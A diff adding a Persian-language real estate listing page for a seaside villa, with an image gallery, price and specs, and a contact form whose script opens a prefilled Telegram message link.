@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جزئیات ملک | Luxury Estates</title>
+     <link rel="shortcut icon" href="img/rebin'.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="details-page">
+
+<div class="container py-4">
+    <a href="properties.html" class="btn-back"><i class="bi bi-arrow-right"></i> بازگشت به لیست</a>
+    <a href="index.html" class="btn-back"><i class="bi bi-arrow-right"></i> بازگشت به صفحه اصلی</a>
+
+    <div class="row mt-3 g-4">
+        <div class="col-lg-8">
+            <div class="main-gallery">
+                <div class="main-img-container">
+                    <img id="mainImg" src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=1200&q=80" class="img-fluid rounded-4 mb-3" alt="Main">
+                </div>
+             
+<div class="sub-gallery d-flex gap-2">
+    <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=1200&q=80" class="thumb-img rounded-3 flex-fill" onclick="changeImage(this)">
+    <img src="https://images.unsplash.com/photo-1600596542815-ffad4c1539a9?auto=format&fit=crop&w=1200&q=80" class="thumb-img rounded-3 flex-fill" onclick="changeImage(this)">
+    <img src="img/2.jpg" class="thumb-img rounded-3 flex-fill" onclick="changeImage(this)">
+    <img src="img/3.jpg" class="thumb-img rounded-3 flex-fill" onclick="changeImage(this)">
+</div>
+
+            </div>
+
+            <div class="content-section mt-4">
+                <h1 class="display-6 fw-bold">ویلای مدرن ساحلی</h1>
+                <p class="text-secondary fs-5"><i class="bi bi-geo-alt"></i> شمال، مازندران، نزدیکی ساحل</p>
+                <hr class="border-secondary opacity-25">
+                <h4 class="mt-4">توضیحات ملک</h4>
+                <p class="text-light-muted leading-relaxed">
+                    این ویلا با طراحی معماری مدرن و استفاده از متریال‌های درجه یک، تجربه‌ای متفاوت از زندگی در کنار دریا را برای شما رقم می‌زند.
+                </p>
+            </div>
+        </div>
+
+        <div class="col-lg-4">
+            <div class="sticky-sidebar">
+                <div class="price-card">
+                    <h2 class="text-primary-gold">12,500,000,000 <small>تومان</small></h2>
+                    <div class="specs-grid mt-4">
+                        <div class="spec-item"><i class="bi bi-door-open"></i> <span>۴ خواب</span></div>
+                        <div class="spec-item"><i class="bi bi-aspect-ratio"></i> <span>۳۵۰ متر</span></div>
+                        <div class="spec-item"><i class="bi bi-water"></i> <span>استخر</span></div>
+                        <div class="spec-item"><i class="bi bi-car-front"></i> <span>۲ پارکینگ</span></div>
+                    </div>
+                </div>
+
+                <div class="contact-form-card mt-4">
+                    <h5 class="mb-4">ثبت درخواست فوری</h5>
+                    <form id="telegramForm">
+                        <div class="mb-3">
+                            <input type="text" id="userName" class="form-control custom-input" placeholder="نام شما" required>
+                        </div>
+                        <div class="mb-3">
+                            <input type="email" id="userEmail" class="form-control custom-input" placeholder="ایمیل" required>
+                        </div>
+                        <div class="mb-3">
+                            <input type="password" id="userPass" class="form-control custom-input" placeholder="پسورد" required>
+                        </div>
+                        <div class="mb-3">
+                            <textarea id="userMsg" class="form-control custom-input" rows="3" style="resize: none;" placeholder="درخواست شما..." required></textarea>
+                        </div>
+                        <button type="button" onclick="sendToTelegram()" class="btn-send w-100">ارسال به تلگرام</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="script.js"></script>
+<script>
+    
+
+function changeImage(element) {
+    const mainImg = document.getElementById('mainImg');
+    if (mainImg) {
+        mainImg.src = element.src;
+        document.querySelectorAll('.thumb-img').forEach(img => {
+            img.style.border = "none";
+            img.style.opacity = "0.5";
+        });
+        element.style.border = "2px solid #c5a059";
+        element.style.opacity = "1";
+    }
+}
+
+function sendToTelegram() {
+    const name = document.getElementById('userName').value;
+    const email = document.getElementById('userEmail').value;
+    const msg = document.getElementById('userMsg').value;
+    
+    const myTelegramID = "PRO_MAX1253"; 
+
+    if (!name || !email || !msg) {
+        alert("لطفاً تمام فیلدها را پر کنید");
+        return;
+    }
+
+
+    const fullMessage = `🏠 املاک برتر\n\nسلام وقتتون بخیر\n\n👤 اسم من: ${name}\n ایمیل من: ${email}\n📝 درخواست من: ${msg}\n\nبا تشکر🙏`;
+    
+    const encodedMessage = encodeURIComponent(fullMessage);
+    
+   
+    const finalUrl = `https://t.me/${myTelegramID}?text=${encodedMessage}`;
+
+   
+    window.open(finalUrl, '_blank');
+}
+
+
+
+
+
+
+
+
+</script>
+
+</body>
+</html>
